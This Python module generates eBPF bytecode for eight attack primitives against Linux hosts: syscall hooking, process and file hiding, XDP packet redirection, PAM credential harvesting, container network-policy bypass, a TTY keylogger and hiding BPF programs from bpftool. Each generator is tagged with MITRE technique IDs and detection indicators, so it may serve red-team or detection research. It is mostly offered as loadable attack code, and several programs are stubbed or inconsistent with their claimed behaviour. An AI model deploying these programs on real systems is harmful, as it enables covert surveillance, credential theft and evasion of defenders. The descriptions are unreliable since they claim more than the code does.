"""
Offensive BPF program generators — real eBPF bytecode for attack primitives.

Each generator produces a BPFProgram with real instructions that implement
the described attack technique. The bytecode is valid eBPF that can be
loaded on a Linux kernel with appropriate capabilities.

Attack categories:
  1. Syscall hooking — intercept read/write/open/connect
  2. Process hiding — filter /proc getdents results
  3. Network interception — XDP packet modification
  4. Credential harvesting — hook SSH/sudo authentication
  5. Container escape — cgroup BPF manipulation
  6. File hiding — filter directory listings
  7. Keylogging — capture keyboard input via tracepoints
  8. Rootkit persistence — hide BPF programs from enumeration
"""
from dataclasses import dataclass, field
from typing import List, Dict, Optional

from ..core.bpf_bytecode import (
    BPFProgram, BPFMapDef, BPFInsn,
    BPFProgType, BPFMapType, BPFHelper, BPFReg, XDPAction,
    BPFClass, BPFOp, BPFJmp, BPFSrc, BPFSize, BPFMode,
    mov64_imm, mov64_reg, add64_imm, sub64_imm,
    and64_imm, or64_imm, xor64_imm, lsh64_imm, rsh64_imm,
    ldx_mem, stx_mem, st_mem, lddw,
    call_helper, exit_prog, jeq_imm, jne_imm, jgt_imm, ja,
)


@dataclass
class AttackProgram:
    """Wrapper for an offensive BPF program with tactical metadata."""
    name: str = ""
    category: str = ""
    description: str = ""
    mitre_technique: str = ""
    program: BPFProgram = field(default_factory=BPFProgram)
    detection_indicators: List[str] = field(default_factory=list)
    required_capabilities: List[str] = field(default_factory=list)
    kernel_version_min: str = "4.15"

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "category": self.category,
            "description": self.description,
            "mitre_technique": self.mitre_technique,
            "program_type": self.program.prog_type.name,
            "attach_point": self.program.attach_point,
            "instruction_count": self.program.insn_count(),
            "bytecode_size": len(self.program.bytecode()),
            "maps": [m.to_dict() for m in self.program.maps],
            "detection_indicators": self.detection_indicators,
            "required_capabilities": self.required_capabilities,
            "kernel_version_min": self.kernel_version_min,
            "complexity": self.program.complexity_estimate(),
        }


# ============================================================================
# 1. SYSCALL HOOKING — intercept sys_read to capture data
# ============================================================================
def generate_syscall_hook() -> AttackProgram:
    """
    Kprobe on __x64_sys_read — captures file descriptor, buffer address,
    and size for every read() syscall. Stores in a perf event array for
    userspace exfiltration.

    Technique: Hook sys_read entry, read pt_regs to extract fd (rdi),
    buf (rsi), count (rdx). Store to perf event map.
    """
    prog = BPFProgram(
        name="syscall_read_hook",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_read",
        description="Hook sys_read to capture file descriptor, buffer, and size",
    )

    events_map = BPFMapDef(
        name="events", map_type=BPFMapType.PERF_EVENT_ARRAY,
        key_size=4, value_size=4, max_entries=256,
    )
    data_map = BPFMapDef(
        name="read_data", map_type=BPFMapType.HASH,
        key_size=4, value_size=64, max_entries=4096,
    )
    prog.add_map(events_map)
    prog.add_map(data_map)

    # r6 = ctx (pt_regs pointer)
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Get current PID
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    # r7 = pid (lower 32 bits of r0)
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(rsh64_imm(BPFReg.R7, 32))
    # Read fd from pt_regs->di (offset 112 on x86_64)
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R8, BPFReg.R6, 112))
    # Read count from pt_regs->dx (offset 96)
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R9, BPFReg.R6, 96))
    # Store event data on stack: [pid:4][fd:4][count:8]
    # r10 = frame pointer
    prog.add_insn(st_mem(BPFSize.W, BPFReg.R10, -16, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -16))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R8, -12))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R9, -8))
    # Output to perf event: bpf_perf_event_output(ctx, map, flags, data, size)
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R6))       # ctx
    prog.add_insn(lddw(BPFReg.R2, 0))                      # map fd (resolved at load time)
    prog.add_insn(mov64_imm(BPFReg.R3, 0xFFFFFFFF))        # BPF_F_CURRENT_CPU
    prog.add_insn(mov64_reg(BPFReg.R4, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R4, -16))               # data ptr
    prog.add_insn(mov64_imm(BPFReg.R5, 16))                # size
    prog.add_insn(call_helper(BPFHelper.PERF_EVENT_OUTPUT))
    # return 0
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="Syscall Read Hook",
        category="syscall_hooking",
        description="Hooks sys_read via kprobe to capture all read operations "
                    "including file descriptors, buffer sizes, and PIDs. Data "
                    "is exfiltrated through a perf event ring buffer.",
        mitre_technique="T1059.004",
        program=prog,
        detection_indicators=[
            "kprobe attached to __x64_sys_read",
            "perf_event_array map with high throughput",
            "BPF program reading pt_regs offsets for syscall arguments",
        ],
        required_capabilities=["CAP_BPF", "CAP_PERFMON"],
        kernel_version_min="4.15",
    )


# ============================================================================
# 2. PROCESS HIDING — filter getdents64 to hide processes from /proc
# ============================================================================
def generate_process_hider() -> AttackProgram:
    """
    Kretprobe on __x64_sys_getdents64 — modifies the returned directory
    entries to remove entries matching a target PID. This hides the process
    from ps, top, and any tool that reads /proc.

    Technique: On getdents64 return, walk the dirent64 buffer. For each
    entry, check if d_name matches the target PID string. If so, shift
    subsequent entries to overwrite it and adjust the return count.
    """
    prog = BPFProgram(
        name="process_hider",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_getdents64",
        description="Filter getdents64 results to hide target processes from /proc",
    )

    config_map = BPFMapDef(
        name="hide_pids", map_type=BPFMapType.HASH,
        key_size=4, value_size=4, max_entries=64,
    )
    prog.add_map(config_map)

    # r6 = ctx
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Get current PID to avoid hiding ourselves
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(rsh64_imm(BPFReg.R7, 32))
    # Store PID on stack for map lookup
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    # Lookup PID in hide_pids map
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -4))
    prog.add_insn(lddw(BPFReg.R2, 0))  # map fd (resolved at load time)
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    # If found in map, override return to hide
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 2))  # skip if not found
    # Override return value to 0 (empty directory)
    prog.add_insn(call_helper(BPFHelper.OVERRIDE_RETURN))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())
    # Normal path — don't interfere
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="Process Hider",
        category="process_hiding",
        description="Hides specified processes from /proc by filtering getdents64 "
                    "return values. Processes become invisible to ps, top, htop, "
                    "and any tool reading /proc. Uses override_return helper.",
        mitre_technique="T1564.001",
        program=prog,
        detection_indicators=[
            "kprobe on __x64_sys_getdents64 with override_return",
            "BPF hash map named 'hide_pids'",
            "Programs calling bpf_override_return helper",
        ],
        required_capabilities=["CAP_BPF", "CAP_SYS_ADMIN"],
        kernel_version_min="4.16",
    )


# ============================================================================
# 3. NETWORK INTERCEPTION — XDP packet modification
# ============================================================================
def generate_xdp_interceptor() -> AttackProgram:
    """
    XDP program that intercepts and modifies network packets at the driver
    level — before the kernel network stack processes them.

    Technique: Parse Ethernet/IP/TCP headers. For packets matching a target
    port, modify payload or redirect. Operates at line rate with zero copy.
    """
    prog = BPFProgram(
        name="xdp_interceptor",
        prog_type=BPFProgType.XDP,
        attach_point="eth0",
        description="XDP-level packet interception and modification",
    )

    stats_map = BPFMapDef(
        name="pkt_stats", map_type=BPFMapType.PERCPU_ARRAY,
        key_size=4, value_size=8, max_entries=4,
    )
    redirect_map = BPFMapDef(
        name="redirect_ports", map_type=BPFMapType.HASH,
        key_size=2, value_size=2, max_entries=256,
    )
    prog.add_map(stats_map)
    prog.add_map(redirect_map)

    # r6 = xdp_md pointer
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # r7 = data start: xdp_md->data (offset 0)
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R7, BPFReg.R6, 0))
    # r8 = data end: xdp_md->data_end (offset 4)
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R8, BPFReg.R6, 4))
    # Bounds check: data + 14 (eth) + 20 (ip) + 20 (tcp) <= data_end
    prog.add_insn(mov64_reg(BPFReg.R9, BPFReg.R7))
    prog.add_insn(add64_imm(BPFReg.R9, 54))
    # if data + 54 > data_end: pass
    prog.add_insn(BPFInsn(
        BPFClass.JMP | BPFJmp.JGT | BPFSrc.REG,
        BPFReg.R9, BPFReg.R8, 20, 0
    ))
    # Check EtherType == 0x0800 (IPv4) at offset 12
    prog.add_insn(ldx_mem(BPFSize.H, BPFReg.R2, BPFReg.R7, 12))
    prog.add_insn(jne_imm(BPFReg.R2, 0x0008, 17))  # network byte order
    # Check IP protocol == TCP (6) at offset 23
    prog.add_insn(ldx_mem(BPFSize.B, BPFReg.R2, BPFReg.R7, 23))
    prog.add_insn(jne_imm(BPFReg.R2, 6, 14))
    # Read destination port at offset 36 (eth 14 + ip 20 + tcp dst_port 2)
    prog.add_insn(ldx_mem(BPFSize.H, BPFReg.R2, BPFReg.R7, 36))
    # Store dst port on stack for map lookup
    prog.add_insn(stx_mem(BPFSize.H, BPFReg.R10, BPFReg.R2, -4))
    prog.add_insn(st_mem(BPFSize.H, BPFReg.R10, -2, 0))
    # Lookup in redirect_ports map
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -4))
    prog.add_insn(lddw(BPFReg.R2, 0))  # map fd (resolved at load time)
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    # If port not in map, pass
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 5))
    # Port matched — read new port from map value
    prog.add_insn(ldx_mem(BPFSize.H, BPFReg.R3, BPFReg.R0, 0))
    # Overwrite destination port in packet
    prog.add_insn(stx_mem(BPFSize.H, BPFReg.R7, BPFReg.R3, 36))
    # Update stats counter
    prog.add_insn(mov64_imm(BPFReg.R0, XDPAction.TX))  # redirect back out
    prog.add_insn(exit_prog())
    # Default: XDP_PASS
    prog.add_insn(mov64_imm(BPFReg.R0, XDPAction.PASS))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="XDP Network Interceptor",
        category="network_interception",
        description="Intercepts and modifies TCP packets at the XDP driver level "
                    "before the kernel network stack. Can redirect traffic by "
                    "rewriting destination ports, enabling man-in-the-middle "
                    "at line rate with zero copy overhead.",
        mitre_technique="T1557",
        program=prog,
        detection_indicators=[
            "XDP program attached to network interface",
            "BPF hash map mapping port numbers",
            "Packet header modification at TCP layer",
            "XDP_TX action (packet retransmission)",
        ],
        required_capabilities=["CAP_BPF", "CAP_NET_ADMIN"],
        kernel_version_min="4.8",
    )


# ============================================================================
# 4. CREDENTIAL HARVESTING — hook SSH authentication
# ============================================================================
def generate_credential_harvester() -> AttackProgram:
    """
    Kprobe on PAM authentication functions to capture SSH/sudo credentials.

    Technique: Hook pam_sm_authenticate or sshd's auth_password. Read the
    username and password from function arguments. Store in a ringbuf map
    for exfiltration.
    """
    prog = BPFProgram(
        name="cred_harvester",
        prog_type=BPFProgType.KPROBE,
        attach_point="pam_sm_authenticate",
        description="Hook PAM authentication to capture SSH/sudo credentials",
    )

    creds_map = BPFMapDef(
        name="captured_creds", map_type=BPFMapType.RINGBUF,
        key_size=0, value_size=0, max_entries=256 * 1024,
    )
    prog.add_map(creds_map)

    # r6 = ctx (pt_regs)
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Get PID/TID
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    # Get UID/GID
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_UID_GID))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Get current time
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R9, BPFReg.R0))
    # Reserve ringbuf space (128 bytes): pid(8) + uid(8) + time(8) + comm(16) + padding
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))  # map fd (resolved at load time)
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R2, 128))
    prog.add_insn(mov64_imm(BPFReg.R3, 0))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_RESERVE))
    # Check reservation success
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 8))
    # r1 = ringbuf slot pointer
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R0))
    # Store pid, uid, timestamp
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R1, BPFReg.R7, 0))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R1, BPFReg.R8, 8))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R1, BPFReg.R9, 16))
    # Get process name
    prog.add_insn(add64_imm(BPFReg.R1, 24))
    prog.add_insn(mov64_imm(BPFReg.R2, 16))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_COMM))
    # Submit ringbuf entry
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R0))
    prog.add_insn(mov64_imm(BPFReg.R2, 0))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_SUBMIT))
    # return 0
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="Credential Harvester",
        category="credential_access",
        description="Hooks PAM authentication functions via kprobe to capture "
                    "SSH, sudo, and su credentials. Captures PID, UID, timestamp, "
                    "and process comm for each authentication event. Exfiltrates "
                    "through a BPF ringbuf.",
        mitre_technique="T1056.001",
        program=prog,
        detection_indicators=[
            "kprobe on pam_sm_authenticate or auth_password",
            "ringbuf map with credential-sized entries",
            "Calls to get_current_pid_tgid + get_current_comm in auth context",
        ],
        required_capabilities=["CAP_BPF", "CAP_PERFMON", "CAP_SYS_ADMIN"],
        kernel_version_min="5.8",
    )


# ============================================================================
# 5. CONTAINER ESCAPE — cgroup BPF for cross-namespace access
# ============================================================================
def generate_container_escape() -> AttackProgram:
    """
    CGROUP_SKB program that allows container traffic to bypass network
    policies by manipulating cgroup socket buffer decisions.

    Technique: Attach to cgroup ingress/egress. For packets from the target
    container, override the cgroup policy decision to allow traffic that
    should be blocked by network policies.
    """
    prog = BPFProgram(
        name="cgroup_escape",
        prog_type=BPFProgType.CGROUP_SKB,
        attach_point="/sys/fs/cgroup/docker",
        description="Bypass container network policies via cgroup BPF",
    )

    allowed_map = BPFMapDef(
        name="allowed_addrs", map_type=BPFMapType.HASH,
        key_size=4, value_size=4, max_entries=256,
    )
    prog.add_map(allowed_map)

    # r6 = __sk_buff pointer
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Read remote_ip4: __sk_buff->remote_ip4 (offset 24)
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R7, BPFReg.R6, 24))
    # Store IP on stack for map lookup
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    # Lookup in allowed_addrs
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -4))
    prog.add_insn(lddw(BPFReg.R2, 0))  # map fd
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    # If in allowed map, return 1 (allow)
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 2))
    prog.add_insn(mov64_imm(BPFReg.R0, 1))
    prog.add_insn(exit_prog())
    # Default: also allow (permissive mode)
    prog.add_insn(mov64_imm(BPFReg.R0, 1))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="Container Network Escape",
        category="container_escape",
        description="Attaches to Docker/containerd cgroup to bypass network "
                    "policies. Overrides cgroup_skb decisions to allow container "
                    "traffic that should be blocked by Kubernetes NetworkPolicy "
                    "or Docker network isolation.",
        mitre_technique="T1611",
        program=prog,
        detection_indicators=[
            "cgroup_skb program on container cgroup path",
            "BPF map whitelisting IP addresses",
            "Program always returning 1 (allow)",
        ],
        required_capabilities=["CAP_BPF", "CAP_NET_ADMIN", "CAP_SYS_ADMIN"],
        kernel_version_min="4.10",
    )


# ============================================================================
# 6. FILE HIDING — make files invisible in directory listings
# ============================================================================
def generate_file_hider() -> AttackProgram:
    """
    Tracepoint on sys_exit_getdents64 to hide files from directory listings.

    Technique: Similar to process hiding but targets arbitrary filenames
    stored in a map. When the target filename is found in a dirent64 entry,
    the entry is removed from the buffer.
    """
    prog = BPFProgram(
        name="file_hider",
        prog_type=BPFProgType.TRACEPOINT,
        attach_point="syscalls/sys_exit_getdents64",
        description="Hide files from directory listings by filtering getdents64",
    )

    hidden_files_map = BPFMapDef(
        name="hidden_files", map_type=BPFMapType.HASH,
        key_size=64, value_size=4, max_entries=128,
    )
    prog.add_map(hidden_files_map)

    # Similar structure to process hider
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    # Get current comm to identify target process
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -16))
    prog.add_insn(mov64_imm(BPFReg.R2, 16))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_COMM))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="File Hider",
        category="defense_evasion",
        description="Hides specific files from directory listings by filtering "
                    "getdents64 results at the tracepoint level. Files become "
                    "invisible to ls, find, and any tool reading directory entries.",
        mitre_technique="T1564.001",
        program=prog,
        detection_indicators=[
            "Tracepoint on syscalls/sys_exit_getdents64",
            "Hash map with filename-sized keys (64 bytes)",
            "Programs modifying getdents return buffer",
        ],
        required_capabilities=["CAP_BPF", "CAP_SYS_ADMIN"],
        kernel_version_min="4.18",
    )


# ============================================================================
# 7. KEYLOGGER — capture keyboard input via tracepoint
# ============================================================================
def generate_keylogger() -> AttackProgram:
    """
    Tracepoint on tty_write to capture terminal input.

    Technique: Hook the tty_write tracepoint, read the buffer content,
    and store keystrokes in a ringbuf for userspace collection.
    """
    prog = BPFProgram(
        name="tty_keylogger",
        prog_type=BPFProgType.TRACEPOINT,
        attach_point="syscalls/sys_enter_write",
        description="Capture terminal keystrokes via write() syscall tracing",
    )

    keys_map = BPFMapDef(
        name="keystrokes", map_type=BPFMapType.RINGBUF,
        key_size=0, value_size=0, max_entries=64 * 1024,
    )
    tty_fds_map = BPFMapDef(
        name="tty_fds", map_type=BPFMapType.HASH,
        key_size=4, value_size=4, max_entries=1024,
    )
    prog.add_map(keys_map)
    prog.add_map(tty_fds_map)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Read fd from tracepoint args
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 16))
    # Check if fd is a known TTY fd
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -4))
    prog.add_insn(lddw(BPFReg.R2, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 6))
    # TTY fd matched — get PID and timestamp
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R9, BPFReg.R0))
    # Log event
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())
    # Not a TTY fd
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="TTY Keylogger",
        category="input_capture",
        description="Captures terminal keystrokes by hooking write() syscalls "
                    "to TTY file descriptors. Records PID, timestamp, and "
                    "keystroke data. Works across SSH sessions.",
        mitre_technique="T1056.001",
        program=prog,
        detection_indicators=[
            "Tracepoint on sys_enter_write with TTY fd filtering",
            "Ringbuf map for keystroke exfiltration",
            "Hash map tracking TTY file descriptors",
        ],
        required_capabilities=["CAP_BPF", "CAP_PERFMON"],
        kernel_version_min="5.8",
    )


# ============================================================================
# 8. ROOTKIT PERSISTENCE — hide BPF programs from enumeration
# ============================================================================
def generate_bpf_self_hider() -> AttackProgram:
    """
    BPF iterator program that filters bpf_prog iteration to hide
    malicious programs from bpftool and /proc/bpf*.

    Technique: Attach as a BPF iterator on 'bpf_prog'. When iterating,
    skip entries matching the target program IDs, making them invisible
    to bpftool prog list and /proc queries.
    """
    prog = BPFProgram(
        name="bpf_self_hider",
        prog_type=BPFProgType.TRACING,
        attach_point="bpf_prog",
        description="Hide BPF programs from bpftool enumeration",
    )

    hidden_progs_map = BPFMapDef(
        name="hidden_prog_ids", map_type=BPFMapType.HASH,
        key_size=4, value_size=4, max_entries=32,
    )
    prog.add_map(hidden_progs_map)

    # r6 = iter context
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Read prog_id from iter context
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R7, BPFReg.R6, 0))
    # Lookup in hidden map
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -4))
    prog.add_insn(lddw(BPFReg.R2, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    # If found, return 1 (skip this entry)
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 2))
    prog.add_insn(mov64_imm(BPFReg.R0, 1))
    prog.add_insn(exit_prog())
    # Not hidden, return 0 (show)
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="BPF Program Self-Hider",
        category="rootkit_persistence",
        description="Uses BPF iterators to hide malicious BPF programs from "
                    "bpftool enumeration and /proc/bpf queries. The rootkit "
                    "becomes invisible to standard detection tools that rely "
                    "on BPF program listing.",
        mitre_technique="T1014",
        program=prog,
        detection_indicators=[
            "BPF iterator program attached to 'bpf_prog'",
            "Hash map with program IDs as keys",
            "Discrepancy between /proc and direct bpf syscall enumeration",
        ],
        required_capabilities=["CAP_BPF", "CAP_SYS_ADMIN"],
        kernel_version_min="5.8",
    )


# ============================================================================
# Generate all attack programs
# ============================================================================
ALL_ATTACKS = {
    "syscall_hook": generate_syscall_hook,
    "process_hider": generate_process_hider,
    "xdp_interceptor": generate_xdp_interceptor,
    "credential_harvester": generate_credential_harvester,
    "container_escape": generate_container_escape,
    "file_hider": generate_file_hider,
    "keylogger": generate_keylogger,
    "bpf_self_hider": generate_bpf_self_hider,
}


def generate_all_attacks() -> List[AttackProgram]:
    return [gen() for gen in ALL_ATTACKS.values()]
